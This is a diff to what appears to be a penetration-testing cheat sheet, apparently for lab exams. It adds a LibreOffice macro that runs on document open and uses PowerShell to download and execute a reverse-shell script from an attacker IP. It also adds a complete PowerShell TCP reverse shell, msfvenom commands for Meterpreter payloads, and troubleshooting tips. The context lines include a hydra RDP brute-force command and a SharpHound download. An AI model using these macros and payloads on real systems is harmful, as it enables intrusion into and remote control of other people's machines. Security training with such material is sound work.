@@ -3055,10 +3055,35 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
  	Invoke-WebRequest -Uri "https://remote-server-address/path/on/remote/server/upload_endpoint" -Method PUT -InFile "C:\path\to\local\file"
  	iwr -uri http://192.168.119.5:80/SharpHound.ps1 -Outfile SharpHound.ps1
 
+# LibreOffice Macros
+
+	1) Open Libreoffice -> tools -> macros -> edit macros
+ 	2) Attach new macro to document
+  	3) Add Macro Code. Change IP Address and port as needed
+   		Sub Main
+			Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.237:80/powershell_reverse_shell.ps1')""")
+		End Sub
+	4) Change macro to trigger on Document opening
+ 	5) Save, create powershell reverse shell:
+	$LHOST = "192.168.45.237"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
+	6) Start web server, and listener. It is recommended to upgrade the reverse shell to a Meterpreter session as soon as possible
+ 
+
+ 	Troubleshooting:
+  		1) Verify Web Server is receiving the request to download the script. If not, check IP address, path and port and macro.
+    		2) If no shell but server received the download: Check ports. 
+      			You might want to change the LPORT to one of the ports that the target system has open
+
+	For example: https://al1z4deh.medium.com/proving-grounds-craft-c92de878e004
+	 	
 # Meterpreter
 
-Using Msfvenom to Make Meterpreter reverse shell:
-    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
+	Meterpreter Reverse Shell 64-bit Windows: 
+		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=5555 --arch x64 --platform windows -f exe -o reverse.exe 
+
+ 	Meterpreter Reverse Shell 32-bit Windows:
+  		msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=5555 --arch x86 --platform windows -f exe -o reverse_32bit.exe 
 
     sudo msfconsole -q
     use multi/handler
